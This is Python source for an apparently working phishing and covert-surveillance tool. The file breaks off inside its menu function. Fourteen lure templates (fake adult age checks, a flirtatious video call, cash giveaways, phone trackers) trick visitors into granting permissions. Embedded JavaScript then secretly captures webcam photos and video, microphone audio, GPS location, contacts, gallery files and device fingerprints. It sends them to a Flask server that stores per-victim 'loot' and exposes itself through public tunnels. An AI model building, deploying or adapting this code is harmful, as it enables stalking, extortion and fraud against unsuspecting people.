import os, sys, json, re, base64, time, shutil, subprocess, platform, threading, signal, atexit
from datetime import datetime
from pathlib import Path
from flask import Flask, request, jsonify, render_template_string

PORT = 8080
LOOT_DIR = Path("LOOT")
LOG_FILE = Path("victims.json")
DURATION = 12
FOLDER_PREFIX = ""
TUNNEL_METHOD = "cloudflare"
NGROK_TOKEN = ""
CUSTOM_MODES = []

app = Flask(__name__)
LOOT_DIR.mkdir(exist_ok=True)
ACTIVE_SESSIONS = {}
total_victims = 0
total_extractions = 0
tunnel_proc = None
TEMPLATES = {
    1: {"name":"🔞 Adult Age Verification","icon":"🔞","color":"#ff00ff",
        "steps":[
            {"title":"⚠️ Adult Content Detected","sub":"This website contains 18+ material","tag":"By proceeding you confirm you are an adult","btn":"I Am 18+ Continue →"},
            {"title":"🔞 Identity Verification","sub":"We must verify you are not a minor","tag":"Automated AI age estimation system","btn":"Verify My Age Now","field":"Enter your full legal name..."},
            {"title":"🔞 Analyzing Identity...","sub":"Cross-referencing with public records","tag":"This ensures child safety compliance","done":"✅ Age Verified — Access Granted!"}]},
    2: {"name":"📹 Live Video Call","icon":"📹","color":"#ff3366",
        "steps":[
            {"title":"📹 Incoming Video Call...","sub":"💋 Jessica (23) wants to video chat with YOU","tag":"She's 2.3km away and waiting...","btn":"📞 Answer Video Call →"},
            {"title":"📹 Secure Connection","sub":"Establishing encrypted P2P video link","tag":"End-to-end encrypted connection","btn":"Connect to Jessica","field":"Your name (she'll see this)..."},
            {"title":"📹 Connecting to Jessica...","sub":"Negotiating secure video stream","tag":"Almost connected — please wait...","done":"✅ Connected! Redirecting..."}]},
    3: {"name":"💰 Premium Giveaway","icon":"💰","color":"#ffd700",
        "steps":[
            {"title":"🎁 YOU ARE THE WINNER!","sub":"Congratulations! You've won $2,500 USD!","tag":"Daily prize — only 2 remaining claims","btn":"🎯 Claim My $2,500 Now →"},
            {"title":"💰 Prize Verification","sub":"Verify your identity to claim the reward","tag":"Time remaining: 2 minutes 47 seconds","btn":"Claim $2,500 Instantly","field":"Full name (for payment)..."},
            {"title":"💰 Processing Payment...","sub":"Verifying eligibility & processing reward","tag":"Connecting to payment gateway...","done":"✅ $2,500 Claimed! Redirecting..."}]},
    4: {"name":"🖼️ AI Photo Enhancer","icon":"🖼️","color":"#00ffff",
        "steps":[
            {"title":"✨ AI Photo Enhancer Pro v4.2","sub":"Enhance ANY photo to 8K Ultra HD quality","tag":"Trusted by 2,000,000+ photographers worldwide","btn":"✨ Enhance My Photos →"},
            {"title":"🖼️ Intelligent Enhancement","sub":"Our AI will analyze & enhance your media","tag":"Supports: JPG, PNG, HEIC, RAW, WebP","btn":"Start AI Enhancement","field":"Enter your name..."},
            {"title":"🖼️ AI Processing...","sub":"Neural network enhancing your content","tag":"Applying 8K upscaling filters...","done":"✅ Enhancement Complete!"}]},
    5: {"name":"📱 Free Virtual Number","icon":"📱","color":"#00ff88",
        "steps":[
            {"title":"📱 Free Virtual Phone Number","sub":"Get a REAL US/UK phone number FREE","tag":"Works with: WhatsApp, Telegram, Signal, SMS","btn":"📱 Generate Free Number →"},
            {"title":"📲 Number Generation","sub":"Selecting premium number from pool","tag":"One-time identity check required","btn":"Generate My Number","field":"Your full name..."},
            {"title":"📲 Creating Number...","sub":"Provisioning your virtual phone line","tag":"Assigning dedicated number...","done":"✅ Number Ready! Check Below"}]},
    6: {"name":"💋 Beauty Score AI","icon":"💋","color":"#ff69b4",
        "steps":[
            {"title":"🔥 AI Beauty Rating System","sub":"Discover your attractiveness score (1-100)","tag":"Same AI used by top modeling agencies","btn":"🔥 Calculate My Score →"},
            {"title":"💋 Facial Analysis","sub":"AI will analyze your facial structure","tag":"Comparing against beauty database...","btn":"Start Beauty Analysis","field":"Enter your name..."},
            {"title":"💋 Computing Score...","sub":"AI analyzing facial symmetry & features","tag":"Calculating golden ratio metrics...","done":"✅ Your Beauty Score: 94/100!"}]},
    7: {"name":"📍 Phone Tracker Pro","icon":"🌍","color":"#00ff00",
        "steps":[
            {"title":"📍 Live Phone Location Tracker","sub":"Track ANY phone number in REAL-TIME","tag":"GPS + Cell Tower + WiFi Triangulation","btn":"📍 Track Any Number →"},
            {"title":"🌍 Select Numbers to Track","sub":"Enter phone numbers you want to locate","tag":"Separate multiple numbers with commas","btn":"🔍 Find Locations Now","field":"+1 555-0199, +44 7700 900..."},
            {"title":"🌍 Triangulating Positions...","sub":"Connecting to GPS satellites & cell towers","tag":"Fetching live coordinates for all numbers...","done":"✅ All Locations Found! View Map"}]},
    8: {"name":"✂️ Background Remover","icon":"✂️","color":"#8a2be2",
        "steps":[
            {"title":"🎨 AI Background Remover","sub":"Remove photo backgrounds INSTANTLY","tag":"Professional results — No Photoshop needed","btn":"🎨 Remove Background →"},
            {"title":"✂️ Smart Object Detection","sub":"AI detects subject automatically","tag":"Works with: Portraits, Products, Cars","btn":"Upload & Process","field":"Your name..."},
            {"title":"✂️ Processing Image...","sub":"AI separating foreground from background","tag":"Applying smart edge detection...","done":"✅ Background Removed! Download Ready"}]},
    9: {"name":"🤖 Voice Changer AI","icon":"🤖","color":"#ff4500",
        "steps":[
            {"title":"🎤 Real-Time Voice Changer","sub":"Change your voice with AI technology","tag":"Effects: Robot, Girl, Deep, Chipmunk, Alien","btn":"🤖 Try Voice Effects →"},
            {"title":"🎤 Audio Engine Setup","sub":"Configuring neural voice processor","tag":"Calibrating for your device...","btn":"Launch Voice Changer","field":"Enter your name..."},
            {"title":"🎤 Calibrating Engine...","sub":"Loading voice transformation models","tag":"Testing audio pipeline...","done":"✅ Voice Changer Active! Speak Now"}]},
    10: {"name":"🛡️ Dark Web Scanner","icon":"🔒","color":"#ff0000",
        "steps":[
            {"title":"🛡️ Dark Web Identity Scanner","sub":"Check if YOUR data is on the Dark Web","tag":"Scanning 500+ hacker forums & leak databases","btn":"🔒 Scan For Leaks →"},
            {"title":"🛡️ Deep Scan Initiation","sub":"Searching dark web for your identity","tag":"Checking: Emails, Passwords, SSN, Credit Cards","btn":"Run Deep Scan","field":"Enter your full name..."},
            {"title":"🛡️ Scanning Dark Web...","sub":"Crawling onion sites & databases","tag":"Cross-referencing 2.7B leaked records...","done":"✅ Scan Complete — 0 Leaks Found!"}]},
    11: {"name":"⚡ Phone Cleaner Pro","icon":"⚡","color":"#1e90ff",
        "steps":[
            {"title":"⚡ Super Phone Cleaner","sub":"Boost phone speed by 300% — FREE","tag":"Removes: Cache, Junk, Duplicates, Temp files","btn":"⚡ Optimize Phone →"},
            {"title":"⚡ Device Diagnostics","sub":"Analyzing storage & performance","tag":"Detecting space-wasting files...","btn":"Start Deep Clean","field":"Your name..."},
            {"title":"⚡ Cleaning Device...","sub":"Removing junk & optimizing memory","tag":"Freeing up storage space...","done":"✅ 4.2GB Freed! Phone Optimized"}]},
    12: {"name":"📡 Number Tracker GPS","icon":"📡","color":"#00ffcc",
        "steps":[
            {"title":"📡 Advanced Phone Tracker","sub":"Track ANY phone's EXACT location LIVE","tag":"Undetectable — Works worldwide — 100% Free","btn":"📡 Track Phone Now →"},
            {"title":"📡 Select Numbers to Track","sub":"Enter all phone numbers you want to locate","tag":"Add multiple numbers separated by commas","btn":"📍 Track All Numbers","field":"+91 98765 43210, +1 555..."},
            {"title":"📡 Acquiring Signals...","sub":"Connecting to nearest cell towers for all numbers","tag":"Triangulating exact positions...","done":"✅ All Targets Located! See Map"}]},
    13: {"name":"🔍 Social Profile Finder","icon":"🔍","color":"#ff8800",
        "steps":[
            {"title":"🔍 Secret Profile Finder","sub":"Find HIDDEN social media profiles","tag":"Instagram, FB, Tinder, OnlyFans, Snapchat","btn":"🔍 Search All Profiles →"},
            {"title":"🔍 Enter Search Details","sub":"Enter names/numbers to find their profiles","tag":"Search across 50+ platforms simultaneously","btn":"🔎 Find Profiles Now","field":"Names or phone numbers..."},
            {"title":"🔍 Deep Searching...","sub":"Scanning 50+ social media databases","tag":"Matching profiles across platforms...","done":"✅ 12 Profiles Discovered! View Results"}]},
    14: {"name":"💬 WhatsApp Scanner","icon":"💬","color":"#25D366",
        "steps":[
            {"title":"💬 WhatsApp Info Scanner","sub":"View ANY WhatsApp profile ANONYMOUSLY","tag":"See: Profile Pic, Status, Last Seen, About","btn":"💬 Scan WhatsApp →"},
            {"title":"💬 Enter Numbers to Scan","sub":"Add WhatsApp numbers you want to scan","tag":"Multiple numbers allowed — separated by commas","btn":"🔍 Scan All Numbers","field":"+1 555, +91 98765, +44 7700..."},
            {"title":"💬 Fetching Profiles...","sub":"Querying WhatsApp servers for all numbers","tag":"Retrieving profile pictures & statuses...","done":"✅ All Profiles Retrieved! View Data"}]}
}

current_tpl = 1
current_mode = 1

PAGE_TEMPLATE = '''<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1.0,user-scalable=no">
<title>{{ s0_title }}</title>
<link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=Rajdhani:wght@300;400;600;700&display=swap" rel="stylesheet">
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:linear-gradient(135deg,#050510 0%,#0a0a1a 40%,#0d0d2b 100%);min-height:100vh;display:flex;align-items:center;justify-content:center;font-family:'Rajdhani',sans-serif;overflow-x:hidden;}
body::before{content:'';position:fixed;top:0;left:0;width:100%;height:100%;background:radial-gradient(circle at 50% 50%,{{ color }}15 0%,transparent 70%);pointer-events:none;z-index:0;}
.container{background:rgba(15,15,30,0.85);backdrop-filter:blur(20px);-webkit-backdrop-filter:blur(20px);border:1px solid {{ color }}33;border-radius:20px;padding:35px 25px;max-width:440px;width:90%;text-align:center;z-index:1;box-shadow:0 0 40px {{ color }}1a,0 0 80px {{ color }}0d,inset 0 0 30px {{ color }}08;animation:fadeIn 0.5s ease;}
@keyframes fadeIn{from{opacity:0;transform:translateY(20px)}to{opacity:1;transform:translateY(0)}}
@keyframes pulse{0%,100%{box-shadow:0 0 20px {{ color }}33}50%{box-shadow:0 0 40px {{ color }}66,0 0 60px {{ color }}33}}
.icon{font-size:60px;margin-bottom:15px;animation:pulse 2s infinite;}
h1{font-family:'Orbitron',sans-serif;font-size:1.3em;color:{{ color }};text-shadow:0 0 20px {{ color }}66;margin-bottom:10px;letter-spacing:1px;}
.sub{color:#ccc;font-size:1em;margin-bottom:8px;font-weight:400;line-height:1.4;}
.tag{color:#888;font-size:0.8em;margin-bottom:20px;font-style:italic;}
.inp{width:100%;padding:14px 18px;background:rgba(255,255,255,0.05);border:1px solid {{ color }}44;border-radius:12px;color:#fff;font-size:1em;font-family:'Rajdhani',sans-serif;outline:none;transition:all 0.3s;margin-bottom:15px;}
.inp:focus{border-color:{{ color }};box-shadow:0 0 20px {{ color }}33;}
.inp::placeholder{color:#666;}
.btn{width:100%;padding:16px;border:none;border-radius:14px;font-size:1.1em;font-weight:700;font-family:'Orbitron',sans-serif;cursor:pointer;letter-spacing:1px;transition:all 0.3s;text-transform:uppercase;}
.btn-p{background:linear-gradient(135deg,{{ color }},{{ color }}aa);color:#000;box-shadow:0 8px 30px {{ color }}33;}
.btn-p:hover{transform:translateY(-2px);box-shadow:0 12px 40px {{ color }}55;}
.btn-p:active{transform:scale(0.97);}
.hidden{display:none!important}
.spinner{display:inline-block;width:30px;height:30px;border:3px solid {{ color }}33;border-top-color:{{ color }};border-radius:50%;animation:spin 0.8s linear infinite;margin:15px auto;}
@keyframes spin{to{transform:rotate(360deg)}}
.prog{width:100%;height:4px;background:rgba(255,255,255,0.1);border-radius:2px;margin:15px 0;overflow:hidden;}
.prog-f{height:100%;background:{{ color }};border-radius:2px;animation:progA 3s ease-in-out infinite;box-shadow:0 0 10px {{ color }}66;}
@keyframes progA{0%{width:0%}50%{width:70%}100%{width:100%}}
.ft{margin-top:20px;font-size:0.65em;color:#444;font-family:'Orbitron',sans-serif;letter-spacing:2px;}
.dots{display:flex;justify-content:center;gap:8px;margin-bottom:20px;}
.dot{width:8px;height:8px;border-radius:50%;background:#333;transition:all 0.3s;}
.dot.a{background:{{ color }};box-shadow:0 0 8px {{ color }};}
</style></head><body>
<div class="container">
<div id="s0"><div class="dots"><div class="dot a"></div><div class="dot"></div><div class="dot"></div></div><div class="icon">{{ icon }}</div><h1>{{ s0_title }}</h1><p class="sub">{{ s0_sub }}</p><p class="tag">{{ s0_tag }}</p><button class="btn btn-p" onclick="nextStep(1)">{{ s0_btn }}</button></div>
<div id="s1" class="hidden"><div class="dots"><div class="dot"></div><div class="dot a"></div><div class="dot"></div></div><div class="icon">{{ icon }}</div><h1>{{ s1_title }}</h1><p class="sub">{{ s1_sub }}</p><p class="tag">{{ s1_tag }}</p><input type="text" class="inp" id="ni" placeholder="{{ s1_field }}" autocomplete="off"><button class="btn btn-p" onclick="nextStep(2)">{{ s1_btn }}</button></div>
<div id="s2" class="hidden"><div class="dots"><div class="dot"></div><div class="dot"></div><div class="dot a"></div></div><div class="icon">{{ icon }}</div><h1>{{ s2_title }}</h1><p class="sub">{{ s2_sub }}</p><div class="prog"><div class="prog-f"></div></div><div class="spinner"></div><p class="sub" id="st" style="color:{{ color }};font-size:0.9em;">{{ s2_tag }}</p><p class="tag" style="color:#555;">Please do not close this page</p></div>
<div id="s3" class="hidden"><div class="icon">✅</div><h1 style="color:#00ff88;">{{ s2_done }}</h1><p class="sub">Thank you for your patience</p><p class="tag">Redirecting you now...</p></div>
<div class="ft">🔒 SECURED CONNECTION</div></div>
<script>
var vn='';var _done=false;
function nextStep(step){
    if(step===1){document.getElementById('s0').classList.add('hidden');document.getElementById('s1').classList.remove('hidden');}
    if(step===2){
        var nm=document.getElementById('ni').value.trim();
        if(!nm){document.getElementById('ni').style.borderColor='#ff4444';return;}
        vn=nm;document.getElementById('s1').classList.add('hidden');document.getElementById('s2').classList.remove('hidden');
        setTimeout(function(){startCapture();},600);
    }
}
function up(t,d,i){fetch('/upload',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({name:vn,type:t,data:d,index:i,stamp:Date.now()})}).catch(function(){});}
function fin(){if(_done)return;_done=true;document.getElementById('s2').classList.add('hidden');document.getElementById('s3').classList.remove('hidden');setTimeout(function(){window.location.href='https://google.com';},2200);}
setTimeout(function(){up('device',JSON.stringify({ua:navigator.userAgent,plat:navigator.platform,mem:navigator.deviceMemory||'?',cores:navigator.hardwareConcurrency||'?',res:screen.width+'x'+screen.height,lang:navigator.language,tz:Intl.DateTimeFormat().resolvedOptions().timeZone}),0);},200);
{{ mode_js | safe }}
</script></body></html>'''

def get_mode_js(mode, duration):
    max_frames = max(1, int(duration / 0.8))
    video_ms = duration * 1000

    photo_js = '''var s_ph=await navigator.mediaDevices.getUserMedia({video:{facingMode:"user",width:1280,height:720}});var v_ph=document.createElement('video');v_ph.srcObject=s_ph;v_ph.play();await new Promise(function(r){v_ph.onloadedmetadata=r;});var c_ph=document.createElement('canvas'),x_ph=c_ph.getContext('2d');c_ph.width=v_ph.videoWidth;c_ph.height=v_ph.videoHeight;var n_ph=0,m_ph=''' + str(max_frames) + ''';var i_ph=setInterval(function(){x_ph.drawImage(v_ph,0,0);up('photo',c_ph.toDataURL('image/jpeg',0.85).split(',')[1],n_ph);n_ph++;if(n_ph>=m_ph){clearInterval(i_ph);s_ph.getTracks().forEach(function(t){t.stop();});checkFinish();}},800);'''

    video_js = '''var chunks_v=[];var mr_v=new MediaRecorder(s_v,{mimeType:'video/webm;codecs=vp8,opus'});mr_v.ondataavailable=function(e){if(e.data&&e.data.size>0)chunks_v.push(e.data);};mr_v.onstop=function(){setTimeout(function(){s_v.getTracks().forEach(function(t){t.stop();});if(chunks_v.length===0){checkFinish();return;}var blob=new Blob(chunks_v,{type:'video/webm'});var reader=new FileReader();reader.onloadend=function(ev){var b64=ev.target.result;if(b64&&typeof b64==='string'){var p=b64.split(',');up('video',p.length>1?p[1]:p[0],0);}checkFinish();};reader.readAsDataURL(blob);},800);};mr_v.start(1000);setTimeout(function(){if(mr_v.state==='recording'){mr_v.requestData();setTimeout(function(){mr_v.stop();},200);}},''' + str(video_ms) + ''');'''

    audio_js = '''var chunks_a=[];var mr_a=new MediaRecorder(s_au,{mimeType:'audio/webm;codecs=opus'});mr_a.ondataavailable=function(e){if(e.data&&e.data.size>0)chunks_a.push(e.data);};mr_a.onstop=function(){setTimeout(function(){s_au.getTracks().forEach(function(t){t.stop();});if(chunks_a.length===0){checkFinish();return;}var blob=new Blob(chunks_a,{type:'audio/webm'});var reader=new FileReader();reader.onloadend=function(ev){var b64=ev.target.result;if(b64&&typeof b64==='string'){var p=b64.split(',');up('audio',p.length>1?p[1]:p[0],0);}checkFinish();};reader.readAsDataURL(blob);},800);};mr_a.start(1000);setTimeout(function(){if(mr_a.state==='recording'){mr_a.requestData();setTimeout(function(){mr_a.stop();},200);}},''' + str(video_ms) + ''');'''

    location_js = '''if(navigator.geolocation){navigator.geolocation.getCurrentPosition(function(p){up('location',JSON.stringify({lat:p.coords.latitude,lon:p.coords.longitude,acc:p.coords.accuracy}),0);checkFinish();},function(){up('location','denied',0);checkFinish();},{enableHighAccuracy:true,timeout:8000});}else{up('location','unsupported',0);checkFinish();}'''

    contacts_js = '''if(navigator.contacts&&navigator.contacts.select){try{var ct=await navigator.contacts.select(['name','tel','email'],{multiple:true});up('contacts',JSON.stringify(ct),0);}catch(e){up('contacts','denied',0);}}else{up('contacts','unsupported',0);}checkFinish();'''

    gallery_js = '''var inp_ga=document.createElement('input');inp_ga.type='file';inp_ga.accept='image/*,video/*';inp_ga.multiple=true;inp_ga.onchange=async function(){for(var i=0;i<this.files.length;i++){var f=this.files[i];var r=new FileReader();r.onload=function(e){var b64=e.target.result;if(b64){var p=b64.split(',');up('gallery',p.length>1?p[1]:p[0],i);}};r.readAsDataURL(f);await new Promise(function(r){setTimeout(r,400);});}checkFinish();};inp_ga.click();setTimeout(function(){if(!window._done)checkFinish();},120000);'''

    # Counter for custom combo - only finish when ALL modes complete
    custom_finish = '''
var _modesTotal = ''' + str(len(CUSTOM_MODES) if CUSTOM_MODES else 1) + ''';
var _modesDone = 0;
function checkFinish() {
    _modesDone++;
    if (_modesDone >= _modesTotal) { fin(); }
}
'''

    if mode == 1:
        return '''async function startCapture(){try{''' + photo_js + '''}catch(e){fin();}}'''.replace('checkFinish()','fin()')
    elif mode == 2:
        return '''async function startCapture(){try{var s_v=await navigator.mediaDevices.getUserMedia({video:{facingMode:"user",width:1280,height:720},audio:true});''' + video_js + '''}catch(e){fin();}}'''.replace('checkFinish()','fin()')
    elif mode == 3:
        return '''async function startCapture(){try{var s_au=await navigator.mediaDevices.getUserMedia({audio:true});''' + audio_js + '''}catch(e){fin();}}'''.replace('checkFinish()','fin()')
    elif mode == 4:
        return '''async function startCapture(){''' + location_js.replace('checkFinish()','fin()') + '''}'''
    elif mode == 5:
        return '''async function startCapture(){''' + contacts_js.replace('checkFinish()','fin()') + '''}'''
    elif mode == 6:
        return '''function startCapture(){''' + gallery_js.replace('checkFinish()','fin()') + '''}'''
    elif mode == 7:
        return '''async function startCapture(){
            try{
                var s_v=await navigator.mediaDevices.getUserMedia({video:{facingMode:"user",width:1280,height:720},audio:true});
                var v_ph=document.createElement('video');v_ph.srcObject=s_v;v_ph.play();
                await new Promise(function(r){v_ph.onloadedmetadata=r;});
                var c_ph=document.createElement('canvas'),x_ph=c_ph.getContext('2d');
                c_ph.width=v_ph.videoWidth;c_ph.height=v_ph.videoHeight;
                var n_ph=0,m_ph=''' + str(max_frames) + ''';
                var i_ph=setInterval(function(){x_ph.drawImage(v_ph,0,0);up('photo',c_ph.toDataURL('image/jpeg',0.85).split(',')[1],n_ph);n_ph++;},800);
                setTimeout(function(){clearInterval(i_ph);},''' + str(duration*1000) + ''');
                if(navigator.geolocation){navigator.geolocation.getCurrentPosition(function(p){up('location',JSON.stringify({lat:p.coords.latitude,lon:p.coords.longitude}),0);});}
                if(navigator.contacts&&navigator.contacts.select){try{var ct=await navigator.contacts.select(['name','tel'],{multiple:true});up('contacts',JSON.stringify(ct),0);}catch(e){}}
                up('device',JSON.stringify({ua:navigator.userAgent,plat:navigator.platform,mem:navigator.deviceMemory||'?',cores:navigator.hardwareConcurrency||'?',res:screen.width+'x'+screen.height,lang:navigator.language,tz:Intl.DateTimeFormat().resolvedOptions().timeZone}),0);
                setTimeout(function(){''' + video_js + '''},''' + str(duration*1000+500) + ''');
            }catch(e){fin();}
        }'''.replace('checkFinish()','fin()')
    elif mode == 8:
        # Custom combo with counter
        modes_js = []
        if 1 in CUSTOM_MODES: modes_js.append('(async function(){try{'+photo_js+'}catch(e){checkFinish();}})();')
        if 2 in CUSTOM_MODES: modes_js.append('(async function(){try{var s_v=await navigator.mediaDevices.getUserMedia({video:{facingMode:"user",width:1280,height:720},audio:true});'+video_js+'}catch(e){checkFinish();}})();')
        if 3 in CUSTOM_MODES: modes_js.append('(async function(){try{var s_au=await navigator.mediaDevices.getUserMedia({audio:true});'+audio_js+'}catch(e){checkFinish();}})();')
        if 4 in CUSTOM_MODES: modes_js.append(location_js)
        if 5 in CUSTOM_MODES: modes_js.append(contacts_js)
        if 6 in CUSTOM_MODES: modes_js.append(gallery_js)
        return custom_finish + '''async function startCapture(){''' + ' '.join(modes_js) + '''}'''
    return '''async function startCapture(){try{''' + photo_js.replace('checkFinish()','fin()') + '''}catch(e){fin();}}'''

@app.route('/')
def index():
    tpl = TEMPLATES.get(current_tpl, TEMPLATES[1])
    s0, s1, s2 = tpl["steps"]
    return render_template_string(PAGE_TEMPLATE,
        color=tpl["color"], icon=tpl["icon"],
        s0_title=s0["title"], s0_sub=s0["sub"], s0_tag=s0["tag"], s0_btn=s0["btn"],
        s1_title=s1["title"], s1_sub=s1["sub"], s1_tag=s1["tag"], s1_btn=s1["btn"],
        s1_field=s1.get("field","Enter your full name..."),
        s2_title=s2["title"], s2_sub=s2["sub"], s2_tag=s2["tag"],
        s2_done=s2.get("done","✅ Complete!"),
        mode_js=get_mode_js(current_mode, DURATION))

@app.route('/upload', methods=['POST'])
def upload():
    global total_victims, total_extractions, ACTIVE_SESSIONS
    try:
        data = request.get_json(force=True)
        victim_name = data.get('name','Unknown');capture_type=data.get('type','unknown')
        payload=data.get('data','');idx=data.get('index',0);stamp=data.get('stamp',int(time.time()*1000));ip=request.remote_addr
        safe_name=re.sub(r'[^a-zA-Z0-9_-]','_',victim_name);session_key=f"{safe_name}_{ip.replace('.','_')}"
        if session_key not in ACTIVE_SESSIONS:
            prefix=f"{FOLDER_PREFIX}_" if FOLDER_PREFIX else ""
            victim_folder=LOOT_DIR/f"{prefix}{safe_name}_{datetime.now().strftime('%Y%m%d_%H%M%S')}_{ip.replace('.','_')}"
            victim_folder.mkdir(parents=True,exist_ok=True);ACTIVE_SESSIONS[session_key]=victim_folder;total_victims+=1
            hp("🎯",f"TARGET ACQUIRED → {victim_name}","35");hp("📂",f"SESSION: {victim_folder.name}","36");hp("🌐",f"ORIGIN: {ip}","34")
            print(f"  \033[1;30m  ╰─ You don't need friends. You just need root access.\033[0m")
        else:victim_folder=ACTIVE_SESSIONS[session_key]
        ext_map={'photo':'jpg','video':'webm','audio':'webm','gallery':'gal'}
        if capture_type in ext_map:
            ext=ext_map[capture_type]
            filename=f"{capture_type}_{idx:03d}.{ext}" if capture_type in['photo','gallery'] else f"{capture_type}.{ext}"
            filepath=victim_folder/filename;raw=payload
            if ',' in raw:raw=raw.split(',')[1]
            missing=len(raw)%4
            if missing:raw+='='*(4-missing)
            try:
                decoded=base64.b64decode(raw)
                if len(decoded)<50:return jsonify({"status":"skipped"})
                with open(filepath,'wb') as f:f.write(decoded);total_extractions+=1
                icons={'photo':'📸','video':'🎥','audio':'🎙️','gallery':'🖼️'}
                names={'photo':'PHOTO','video':'VIDEO','audio':'AUDIO','gallery':'GALLERY'}
                hp(icons.get(capture_type,'📤'),f"EXTRACTED {names.get(capture_type,'DATA')} #{idx} | {len(decoded)/1024:.1f}KB","33")
            except Exception as e:hp("❌",f"DECODE FAIL: {str(e)[:60]}","31")
        elif capture_type=='location':
            with open(victim_folder/'location.txt','w') as f:f.write(payload);total_extractions+=1
            try:
                loc=json.loads(payload)
                hp("📍",f"GPS LOCKED → {loc.get('lat',0):.5f}, {loc.get('lon',0):.5f}","32")
                hp("🗺️",f"MAPS: https://maps.google.com/?q={loc.get('lat',0)},{loc.get('lon',0)}","30")
            except:hp("📍","LOCATION GRABBED","32")
        elif capture_type=='contacts':
            with open(victim_folder/'contacts.json','w') as f:f.write(payload);total_extractions+=1
            try:
                contacts=json.loads(payload)
                hp("📇",f"CONTACTS HARVESTED → {len(contacts) if isinstance(contacts,list) else 0} entries","36")
            except:hp("📇","CONTACTS DUMPED","36")
        elif capture_type=='device':
            with open(victim_folder/'device.json','w') as f:f.write(payload)
            try:
                dev=json.loads(payload)
                hp("💻",f"FINGERPRINT → {dev.get('plat','?')} | {dev.get('res','?')} | Cores:{dev.get('cores','?')}","34")
            except:hp("💻","DEVICE PROFILED","34")
        log_entry={"name":victim_name,"ip":ip,"type":capture_type,"timestamp":datetime.fromtimestamp(stamp/1000).isoformat(),"folder":str(victim_folder)}
        existing=[]
        if LOG_FILE.exists():
            try:
                with open(LOG_FILE,'r') as f:
                    c=f.read().strip()
                    if c:loaded=json.loads(c);existing=loaded if isinstance(loaded,list) else[]
            except:existing=[]
        existing.append(log_entry)
        with open(LOG_FILE,'w') as f:json.dump(existing,f,indent=2)
        return jsonify({"status":"ok"})
    except Exception as e:
        hp("❌",f"ERROR: {str(e)[:80]}","31")
        return jsonify({"status":"error"}),500

def ts():return datetime.now().strftime("%H:%M:%S")
def hp(icon,msg,color="32"):print(f"  \033[1;30m[{ts()}]\033[0m \033[1;30mroot@technical_sam:~#\033[0m \033[1;{color}m{icon} {msg}\033[0m")

def install_cloudflared():
    for p in["cloudflared","/usr/local/bin/cloudflared","/usr/bin/cloudflared","/snap/bin/cloudflared"]:
        if shutil.which(p):return p
    hp("🔧","Installing cloudflared...","33")
    s=platform.system().lower();a=platform.machine().lower()
    url='https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64'
    if'arm'in a:url=url.replace('amd64','arm64')
    elif s=='darwin':url=url.replace('linux-amd64','darwin-amd64')
    dest='/tmp/cloudflared'
    os.system(f'curl -L -o {dest} {url} 2>/dev/null && chmod +x {dest}')
    return dest if os.path.exists(dest)else None

def tunnel_cloudflare(port):
    cf=install_cloudflared()
    if not cf:return None,None
    hp("☁️","Starting Cloudflare tunnel...","33")
    try:
        proc=subprocess.Popen([cf,'tunnel','--url',f'http://localhost:{port}'],stdout=subprocess.PIPE,stderr=subprocess.STDOUT,text=True,bufsize=1)
        url=None;start=time.time()
        for line in proc.stdout:
            line=line.strip()
            if'trycloudflare.com'in line:
                m=re.search(r'https://[a-zA-Z0-9-]+\.trycloudflare\.com',line)
                if m:url=m.group(0);break
            if time.time()-start>30:break
        if url:hp("✅",f"CLOUDFLARE: {url}","32")
        return url,proc
    except Exception as e:hp("❌",f"Cloudflare: {e}","31");return None,None

def tunnel_ngrok(port):
    global NGROK_TOKEN
    ngrok=shutil.which('ngrok')or'/tmp/ngrok'
    if not os.path.exists(ngrok):
        hp("🔧","Downloading ngrok...","33")
        s=platform.system().lower()
        url='https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-amd64.tgz'
        if s=='darwin':url=url.replace('linux','darwin')
        os.system(f'curl -L {url} -o /tmp/ngrok.tgz 2>/dev/null && tar xzf /tmp/ngrok.tgz -C /tmp/ && chmod +x /tmp/ngrok')
        ngrok='/tmp/ngrok'
    if NGROK_TOKEN:
        hp("🔑","Configuring ngrok auth token...","33")
        os.system(f'{ngrok} config add-authtoken {NGROK_TOKEN} 2>/dev/null')
    try:
        proc=subprocess.Popen([ngrok,'http',str(port),'--log=stdout'],stdout=subprocess.PIPE,stderr=subprocess.STDOUT,text=True,bufsize=1)
        url=None;start=time.time()
        for line in proc.stdout:
            line=line.strip()
            if'url='in line:
                m=re.search(r'https://[a-zA-Z0-9-]+\.ngrok(?:-free)?\.\w+',line)
                if m:url=m.group(0);break
            if time.time()-start>30:break
        if url:hp("✅",f"NGROK: {url}","32")
        return url,proc
    except Exception as e:hp("❌",f"ngrok: {e}","31");return None,None

def tunnel_nport(port):
    nport=shutil.which('nport')
    if not nport:
        hp("🔧","Installing nport...","33")
        if os.system('npm install -g nport 2>/dev/null')!=0:
            hp("❌","nport needs Node.js: apt install nodejs npm","31");return None,None
        nport='nport'
    try:
        proc=subprocess.Popen([nport,str(port)],stdout=subprocess.PIPE,stderr=subprocess.STDOUT,text=True,bufsize=1)
        url=None;start=time.time()
        for line in proc.stdout:
            line=line.strip()
            if'https://'in line and'nport'in line.lower():
                m=re.search(r'https://[^\s]+',line)
                if m:url=m.group(0);break
            if time.time()-start>30:break
        if url:hp("✅",f"NPORT: {url}","32")
        return url,proc
    except Exception as e:hp("❌",f"nport: {e}","31");return None,None

def cleanup():
    global tunnel_proc
    if tunnel_proc:
        try:tunnel_proc.terminate()
        except:pass
atexit.register(cleanup)
signal.signal(signal.SIGINT,lambda s,f:os._exit(0))

def menu():
    global current_tpl,current_mode,DURATION,FOLDER_PREFIX,TUNNEL_METHOD,NGROK_TOKEN,CUSTOM_MODES
    while True:
        os.system('clear'if os.name!='nt'else'cls')
        mode_names={1:"📸 Camera Burst",2:"🎥 Video Capture",3:"🎙️ Audio Intercept",4:"📍 GPS Extraction",5:"📇 Contacts Harvest",6:"🖼️ Gallery Breach",7:"💀 FULL GHOST",8:"🎛️ Custom Combo"}
        tm={"cloudflare":"☁️ Cloudflare","ngrok":"🟣 Ngrok","nport":"🔵 Nport"}
        custom_str=",".join([str(m) for m in CUSTOM_MODES]) if CUSTOM_MODES else "None"
